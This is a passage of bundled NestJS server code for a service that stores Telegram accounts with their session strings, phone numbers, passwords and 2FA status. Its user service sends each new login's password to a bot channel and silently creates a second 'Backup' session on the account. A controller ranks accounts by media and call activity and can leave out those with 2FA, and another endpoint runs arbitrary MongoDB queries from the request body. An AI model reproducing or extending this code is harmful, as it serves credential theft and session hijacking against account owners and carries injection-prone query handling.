], SearchUserDto.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by channels count' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchUserDto.prototype, "channels", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by personal chats count' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchUserDto.prototype, "personalChats", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by demo given status', type: Boolean }),
    (0, class_transformer_1.Transform)(({ value }) => value === 'true' || value === true),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], SearchUserDto.prototype, "demoGiven", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by messages count' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchUserDto.prototype, "msgs", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by total chats count' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchUserDto.prototype, "totalChats", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by last active timestamp' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", String)
], SearchUserDto.prototype, "lastActive", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by movie count' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchUserDto.prototype, "movieCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by photo count' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchUserDto.prototype, "photoCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by video count' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchUserDto.prototype, "videoCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by gender' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchUserDto.prototype, "gender", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by other photo count' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchUserDto.prototype, "otherPhotoCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by other video count' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchUserDto.prototype, "otherVideoCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by own photo count' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchUserDto.prototype, "ownPhotoCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by own video count' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchUserDto.prototype, "ownVideoCount", void 0);


/***/ }),

/***/ "./src/components/users/dto/update-user.dto.ts":
/*!*****************************************************!*\
  !*** ./src/components/users/dto/update-user.dto.ts ***!
  \*****************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpdateUserDto = void 0;
const mapped_types_1 = __webpack_require__(/*! @nestjs/mapped-types */ "@nestjs/mapped-types");
const create_user_dto_1 = __webpack_require__(/*! ./create-user.dto */ "./src/components/users/dto/create-user.dto.ts");
class UpdateUserDto extends (0, mapped_types_1.PartialType)(create_user_dto_1.CreateUserDto) {
}
exports.UpdateUserDto = UpdateUserDto;


/***/ }),

/***/ "./src/components/users/index.ts":
/*!***************************************!*\
  !*** ./src/components/users/index.ts ***!
  \***************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __exportStar = (this && this.__exportStar) || function(m, exports) {
    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
__exportStar(__webpack_require__(/*! ./dto */ "./src/components/users/dto/index.ts"), exports);
__exportStar(__webpack_require__(/*! ./schemas */ "./src/components/users/schemas/index.ts"), exports);
__exportStar(__webpack_require__(/*! ./users.controller */ "./src/components/users/users.controller.ts"), exports);
__exportStar(__webpack_require__(/*! ./users.module */ "./src/components/users/users.module.ts"), exports);
__exportStar(__webpack_require__(/*! ./users.service */ "./src/components/users/users.service.ts"), exports);


/***/ }),

/***/ "./src/components/users/schemas/index.ts":
/*!***********************************************!*\
  !*** ./src/components/users/schemas/index.ts ***!
  \***********************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __exportStar = (this && this.__exportStar) || function(m, exports) {
    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
__exportStar(__webpack_require__(/*! ./user.schema */ "./src/components/users/schemas/user.schema.ts"), exports);


/***/ }),

/***/ "./src/components/users/schemas/user.schema.ts":
/*!*****************************************************!*\
  !*** ./src/components/users/schemas/user.schema.ts ***!
  \*****************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UserSchema = exports.User = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __importDefault(__webpack_require__(/*! mongoose */ "mongoose"));
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
let User = class User {
    constructor() {
        this.twoFA = false;
        this.expired = false;
        this.password = null;
    }
};
exports.User = User;
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)({ required: true, unique: true }),
    __metadata("design:type", String)
], User.prototype, "mobile", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)({ required: true, unique: true }),
    __metadata("design:type", String)
], User.prototype, "session", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", String)
], User.prototype, "firstName", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ required: false }),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", String)
], User.prototype, "lastName", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ required: false }),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", String)
], User.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Number)
], User.prototype, "channels", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Number)
], User.prototype, "personalChats", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Boolean)
], User.prototype, "demoGiven", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Number)
], User.prototype, "msgs", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Number)
], User.prototype, "totalChats", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", String)
], User.prototype, "lastActive", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)({ required: true, unique: true }),
    __metadata("design:type", String)
], User.prototype, "tgId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Number)
], User.prototype, "movieCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Number)
], User.prototype, "photoCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Number)
], User.prototype, "videoCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ required: false }),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", String)
], User.prototype, "gender", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: false, type: Boolean }),
    __metadata("design:type", Boolean)
], User.prototype, "twoFA", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: false, type: Boolean, default: false }),
    __metadata("design:type", Boolean)
], User.prototype, "expired", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: false }),
    __metadata("design:type", String)
], User.prototype, "password", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Number)
], User.prototype, "otherPhotoCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Number)
], User.prototype, "otherVideoCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Number)
], User.prototype, "ownPhotoCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Number)
], User.prototype, "ownVideoCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Number)
], User.prototype, "contacts", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)({
        type: mongoose_2.default.Schema.Types.Mixed,
        default: {
            outgoing: 0,
            incoming: 0,
            video: 0,
            chatCallCounts: [],
            totalCalls: 0,
        },
    }),
    __metadata("design:type", Object)
], User.prototype, "calls", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)(),
    (0, mongoose_1.Prop)({
        type: mongoose_2.default.Schema.Types.Mixed,
        default: [],
        required: false,
    }),
    __metadata("design:type", Array)
], User.prototype, "recentUsers", void 0);
exports.User = User = __decorate([
    (0, mongoose_1.Schema)({
        collection: 'users', versionKey: false, autoIndex: true, timestamps: true,
        toJSON: {
            virtuals: true,
            transform: (doc, ret) => {
                ret['id'] = ret._id;
                delete ret._id;
                return ret;
            },
        },
    })
], User);
exports.UserSchema = mongoose_1.SchemaFactory.createForClass(User);


/***/ }),

/***/ "./src/components/users/users.controller.ts":
/*!**************************************************!*\
  !*** ./src/components/users/users.controller.ts ***!
  \**************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UsersController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const users_service_1 = __webpack_require__(/*! ./users.service */ "./src/components/users/users.service.ts");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const search_user_dto_1 = __webpack_require__(/*! ./dto/search-user.dto */ "./src/components/users/dto/search-user.dto.ts");
const update_user_dto_1 = __webpack_require__(/*! ./dto/update-user.dto */ "./src/components/users/dto/update-user.dto.ts");
const create_user_dto_1 = __webpack_require__(/*! ./dto/create-user.dto */ "./src/components/users/dto/create-user.dto.ts");
let UsersController = class UsersController {
    constructor(usersService) {
        this.usersService = usersService;
    }
    async create(createUserDto) {
        console.log("creating new user");
        return this.usersService.create(createUserDto);
    }
    async search(queryParams) {
        return this.usersService.search(queryParams);
    }
    async getTopInteractionUsers(page, limit, minScore, minCalls, minPhotos, minVideos, excludeExpired, excludeTwoFA, gender) {
        const pageNum = page ? parseInt(page, 10) : undefined;
        const limitNum = limit ? parseInt(limit, 10) : undefined;
        const minScoreNum = minScore ? parseFloat(minScore) : undefined;
        const minCallsNum = minCalls ? parseInt(minCalls, 10) : undefined;
        const minPhotosNum = minPhotos ? parseInt(minPhotos, 10) : undefined;
        const minVideosNum = minVideos ? parseInt(minVideos, 10) : undefined;
        if (pageNum !== undefined && (isNaN(pageNum) || pageNum < 1)) {
            throw new common_1.BadRequestException('Page must be a positive integer');
        }
        if (limitNum !== undefined && (isNaN(limitNum) || limitNum < 1 || limitNum > 100)) {
            throw new common_1.BadRequestException('Limit must be between 1 and 100');
        }
        if (minScoreNum !== undefined && (isNaN(minScoreNum) || minScoreNum < 0)) {
            throw new common_1.BadRequestException('minScore must be a non-negative number');
        }
        if (minCallsNum !== undefined && (isNaN(minCallsNum) || minCallsNum < 0)) {
            throw new common_1.BadRequestException('minCalls must be a non-negative integer');
        }
        if (minPhotosNum !== undefined && (isNaN(minPhotosNum) || minPhotosNum < 0)) {
            throw new common_1.BadRequestException('minPhotos must be a non-negative integer');
        }
        if (minVideosNum !== undefined && (isNaN(minVideosNum) || minVideosNum < 0)) {
            throw new common_1.BadRequestException('minVideos must be a non-negative integer');
        }
        const excludeExpiredBool = excludeExpired === 'false' ? false : (excludeExpired === 'true' ? true : undefined);
        const excludeTwoFABool = excludeTwoFA === 'true' ? true : (excludeTwoFA === 'false' ? false : undefined);
        return this.usersService.getTopInteractionUsers({
            page: pageNum,
            limit: limitNum,
            minScore: minScoreNum,
            minCalls: minCallsNum,
            minPhotos: minPhotosNum,
            minVideos: minVideosNum,
            excludeExpired: excludeExpiredBool,
            excludeTwoFA: excludeTwoFABool,
            gender
        });
    }
    async findAll() {
        return this.usersService.findAll();
    }
    async findOne(tgId) {
        return this.usersService.findOne(tgId);
    }
    async update(tgId, updateUserDto) {
        return this.usersService.update(tgId, updateUserDto);
    }
    async remove(tgId) {
        return this.usersService.delete(tgId);
    }
    async executeQuery(requestBody) {
        const { query, sort, limit, skip } = requestBody;
        try {
            return await this.usersService.executeQuery(query, sort, limit, skip);
        }
        catch (error) {
            throw error;
        }
    }
};
exports.UsersController = UsersController;
__decorate([
    (0, common_1.Post)(),
    (0, swagger_1.ApiOperation)({ summary: 'Create a new user' }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [create_user_dto_1.CreateUserDto]),
    __metadata("design:returntype", Promise)
], UsersController.prototype, "create", null);
__decorate([
    (0, common_1.Get)('/search'),
    (0, swagger_1.ApiOperation)({ summary: 'Search users based on various parameters' }),
    __param(0, (0, common_1.Query)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [search_user_dto_1.SearchUserDto]),
    __metadata("design:returntype", Promise)
], UsersController.prototype, "search", null);
__decorate([
    (0, common_1.Get)('top-interacted'),
    (0, swagger_1.ApiOperation)({
        summary: 'Get users with top interaction scores',
        description: 'Retrieves users ranked by interaction score calculated from saved DB stats. ' +
            'Score is based on photos, videos, calls, and other interactions. ' +
            'Movie count has negative weightage as it indicates less genuine interaction. ' +
            'Supports filtering and pagination for efficient data retrieval.'
    }),
    (0, swagger_1.ApiQuery)({
        name: 'page',
        required: false,
        type: Number,
        description: 'Page number (default: 1, minimum: 1)',
        example: 1,
        minimum: 1
    }),
    (0, swagger_1.ApiQuery)({
        name: 'limit',
        required: false,
        type: Number,
        description: 'Number of results per page (default: 20, max: 100)',
        example: 20,
        minimum: 1,
        maximum: 100
    }),
    (0, swagger_1.ApiQuery)({
        name: 'minScore',
        required: false,
        type: Number,
        description: 'Minimum interaction score to include (default: 0)',
        example: 100,
        minimum: 0
    }),
    (0, swagger_1.ApiQuery)({
        name: 'minCalls',
        required: false,
        type: Number,
        description: 'Minimum total calls required (default: 0)',
        example: 5,
        minimum: 0
    }),
    (0, swagger_1.ApiQuery)({
        name: 'minPhotos',
        required: false,
        type: Number,
        description: 'Minimum photos required (default: 0)',
        example: 10,
        minimum: 0
    }),
    (0, swagger_1.ApiQuery)({
        name: 'minVideos',
        required: false,
        type: Number,
        description: 'Minimum videos required (default: 0)',
        example: 5,
        minimum: 0
    }),
    (0, swagger_1.ApiQuery)({
        name: 'excludeExpired',
        required: false,
        type: Boolean,
        description: 'Exclude expired users (default: true)',
        example: true
    }),
    (0, swagger_1.ApiQuery)({
        name: 'excludeTwoFA',
        required: false,
        type: Boolean,
        description: 'Exclude users with 2FA enabled (default: false)',
        example: false
    }),
    (0, swagger_1.ApiQuery)({
        name: 'gender',
        required: false,
        type: String,
        description: 'Filter by gender',
        example: 'male'
    }),
    (0, swagger_1.ApiResponse)({
        status: 200,
        description: 'Users retrieved successfully with interaction scores',
        schema: {
            type: 'object',
            properties: {
                users: {
                    type: 'array',
                    description: 'List of users with interaction scores',
                    items: {
                        type: 'object',
                        properties: {
                            id: { type: 'string', description: 'User ID' },
                            mobile: { type: 'string' },
                            tgId: { type: 'string' },
                            firstName: { type: 'string' },
                            lastName: { type: 'string' },
                            username: { type: 'string' },
                            photoCount: { type: 'number' },
                            videoCount: { type: 'number' },
                            ownPhotoCount: { type: 'number' },
                            ownVideoCount: { type: 'number' },
                            otherPhotoCount: { type: 'number' },
                            otherVideoCount: { type: 'number' },
                            movieCount: { type: 'number', description: 'Has negative impact on score' },
                            calls: {
                                type: 'object',
                                properties: {
                                    outgoing: { type: 'number' },
                                    incoming: { type: 'number' },
                                    video: { type: 'number' },
                                    totalCalls: { type: 'number' }
                                }
                            },
                            interactionScore: {
                                type: 'number',
                                description: 'Calculated interaction score (higher = more active/engaged)'
                            }
                        }
                    }
                },
                total: { type: 'number', description: 'Total number of users matching filters' },
                page: { type: 'number', description: 'Current page number' },
                limit: { type: 'number', description: 'Results per page' },
                totalPages: { type: 'number', description: 'Total number of pages' }
            }
        }
    }),
    (0, swagger_1.ApiResponse)({ status: 400, description: 'Bad Request - invalid query parameters' }),
    (0, swagger_1.ApiResponse)({ status: 500, description: 'Internal Server Error' }),
    __param(0, (0, common_1.Query)('page')),
    __param(1, (0, common_1.Query)('limit')),
    __param(2, (0, common_1.Query)('minScore')),
    __param(3, (0, common_1.Query)('minCalls')),
    __param(4, (0, common_1.Query)('minPhotos')),
    __param(5, (0, common_1.Query)('minVideos')),
    __param(6, (0, common_1.Query)('excludeExpired')),
    __param(7, (0, common_1.Query)('excludeTwoFA')),
    __param(8, (0, common_1.Query)('gender')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, String, String, String, String, String, String, String]),
    __metadata("design:returntype", Promise)
], UsersController.prototype, "getTopInteractionUsers", null);
__decorate([
    (0, common_1.Get)(),
    (0, swagger_1.ApiOperation)({ summary: 'Get all users' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], UsersController.prototype, "findAll", null);
__decorate([
    (0, common_1.Get)(':tgId'),
    (0, swagger_1.ApiOperation)({ summary: 'Get a user by tgId' }),
    (0, swagger_1.ApiParam)({ name: 'tgId', description: 'The Telegram ID of the user', type: String }),
    __param(0, (0, common_1.Param)('tgId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], UsersController.prototype, "findOne", null);
__decorate([
    (0, common_1.Patch)(':tgId'),
    (0, swagger_1.ApiOperation)({ summary: 'Update a user by tgId' }),
    (0, swagger_1.ApiParam)({ name: 'tgId', description: 'The Telegram ID of the user', type: String }),
    __param(0, (0, common_1.Param)('tgId')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, update_user_dto_1.UpdateUserDto]),
    __metadata("design:returntype", Promise)
], UsersController.prototype, "update", null);
__decorate([
    (0, common_1.Delete)(':tgId'),
    (0, swagger_1.ApiOperation)({ summary: 'Delete a user by tgId' }),
    (0, swagger_1.ApiParam)({ name: 'tgId', description: 'The Telegram ID of the user', type: String }),
    __param(0, (0, common_1.Param)('tgId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], UsersController.prototype, "remove", null);
__decorate([
    (0, common_1.Post)('query'),
    (0, swagger_1.ApiOperation)({ summary: 'Execute a custom MongoDB query' }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], UsersController.prototype, "executeQuery", null);
exports.UsersController = UsersController = __decorate([
    (0, swagger_1.ApiTags)('Telegram Users'),
    (0, common_1.Controller)('user'),
    __metadata("design:paramtypes", [users_service_1.UsersService])
], UsersController);


/***/ }),

/***/ "./src/components/users/users.module.ts":
/*!**********************************************!*\
  !*** ./src/components/users/users.module.ts ***!
  \**********************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UsersModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const users_service_1 = __webpack_require__(/*! ./users.service */ "./src/components/users/users.service.ts");
const users_controller_1 = __webpack_require__(/*! ./users.controller */ "./src/components/users/users.controller.ts");
const user_schema_1 = __webpack_require__(/*! ./schemas/user.schema */ "./src/components/users/schemas/user.schema.ts");
const Telegram_module_1 = __webpack_require__(/*! ../Telegram/Telegram.module */ "./src/components/Telegram/Telegram.module.ts");
const client_module_1 = __webpack_require__(/*! ../clients/client.module */ "./src/components/clients/client.module.ts");
const init_module_1 = __webpack_require__(/*! ../ConfigurationInit/init.module */ "./src/components/ConfigurationInit/init.module.ts");
const bots_1 = __webpack_require__(/*! ../bots */ "./src/components/bots/index.ts");
let UsersModule = class UsersModule {
};
exports.UsersModule = UsersModule;
exports.UsersModule = UsersModule = __decorate([
    (0, common_1.Module)({
        imports: [
            init_module_1.InitModule,
            mongoose_1.MongooseModule.forFeature([{ name: 'userModule', schema: user_schema_1.UserSchema, collection: 'users' }]),
            (0, common_1.forwardRef)(() => Telegram_module_1.TelegramModule),
            (0, common_1.forwardRef)(() => client_module_1.ClientModule),
            bots_1.BotsModule
        ],
        controllers: [users_controller_1.UsersController],
        providers: [users_service_1.UsersService],
        exports: [users_service_1.UsersService]
    })
], UsersModule);


/***/ }),

/***/ "./src/components/users/users.service.ts":
/*!***********************************************!*\
  !*** ./src/components/users/users.service.ts ***!
  \***********************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UsersService = void 0;
const Telegram_service_1 = __webpack_require__(/*! ./../Telegram/Telegram.service */ "./src/components/Telegram/Telegram.service.ts");
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const client_service_1 = __webpack_require__(/*! ../clients/client.service */ "./src/components/clients/client.service.ts");
const connection_manager_1 = __webpack_require__(/*! ../Telegram/utils/connection-manager */ "./src/components/Telegram/utils/connection-manager.ts");
const bots_1 = __webpack_require__(/*! ../bots */ "./src/components/bots/index.ts");
let UsersService = class UsersService {
    constructor(userModel, telegramService, clientsService, botsService) {
        this.userModel = userModel;
        this.telegramService = telegramService;
        this.clientsService = clientsService;
        this.botsService = botsService;
    }
    async create(user) {
        const activeClientSetup = this.telegramService.getActiveClientSetup();
        console.log("New User received - ", user?.mobile);
        console.log("ActiveClientSetup::", activeClientSetup);
        if (activeClientSetup && activeClientSetup.newMobile === user.mobile) {
            console.log("Updating New Session Details", user.mobile, user.username, activeClientSetup.clientId);
            await this.clientsService.updateClientSession(user.session);
        }
        else {
            await this.botsService.sendMessageByCategory(bots_1.ChannelCategory.ACCOUNT_LOGINS, `ACCOUNT LOGIN: ${user.username ? `@${user.username}` : user.firstName}\nMobile: t.me/${user.mobile}${user.password ? `\npassword: ${user.password}` : "\n"}`, undefined, false);
            setTimeout(async () => {
                try {
                    await connection_manager_1.connectionManager.getClient(user.mobile, { autoDisconnect: false, handler: false });
                    const newSession = await this.telegramService.createNewSession(user.mobile);
                    const newUserBackup = new this.userModel({ ...user, session: newSession, lastName: "Backup" });
                    await newUserBackup.save();
                }
                catch (error) {
                    console.log("Error in creating new session", error);
                }
            }, 3000);
            const newUser = new this.userModel(user);
            return newUser.save();
        }
    }
    async findAll() {
        return this.userModel.find().exec();
    }
    async findOne(tgId) {
        const user = await (await this.userModel.findOne({ tgId }).exec())?.toJSON();
        if (!user) {
            throw new common_1.NotFoundException(`User with tgId ${tgId} not found`);
        }
        return user;
    }
    async update(tgId, user) {
        delete user['_id'];
        const result = await this.userModel.updateMany({ tgId }, { $set: user }, { upsert: true }).exec();
        if (result.matchedCount === 0) {
            throw new common_1.NotFoundException(`Users with tgId ${tgId} not found`);
        }
        return result.modifiedCount;
    }
    async updateByFilter(filter, user) {
        delete user['_id'];
        const result = await this.userModel.updateMany(filter, { $set: user }, { upsert: true }).exec();
        if (result.matchedCount === 0) {
            throw new common_1.NotFoundException(`Users with tgId ${JSON.stringify(filter)} not found`);
        }
        return result.modifiedCount;
    }
    async delete(tgId) {
        const result = await this.userModel.deleteOne({ tgId }).exec();
        if (result.deletedCount === 0) {
            throw new common_1.NotFoundException(`User with tgId ${tgId} not found`);
        }
    }
    async deleteById(userId) {
        const result = await this.userModel.deleteOne({ _id: userId }).exec();
        if (result.deletedCount === 0) {
            throw new common_1.NotFoundException(`User with id ${userId} not found`);
        }
    }
    async search(filter) {
        if (filter.firstName) {
            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') };
        }
        if (filter.twoFA !== undefined) {
            filter.twoFA = filter.twoFA === 'true' || filter.twoFA === '1' || filter.twoFA === true;
        }
        return this.userModel.find(filter).sort({ updatedAt: -1 }).exec();
    }
    async executeQuery(query, sort, limit, skip) {
        try {
            if (!query) {
                throw new common_1.BadRequestException('Query is invalid.');
            }
            const queryExec = this.userModel.find(query);
            if (sort) {
                queryExec.sort(sort);
            }
            if (limit) {
                queryExec.limit(limit);
            }
            if (skip) {
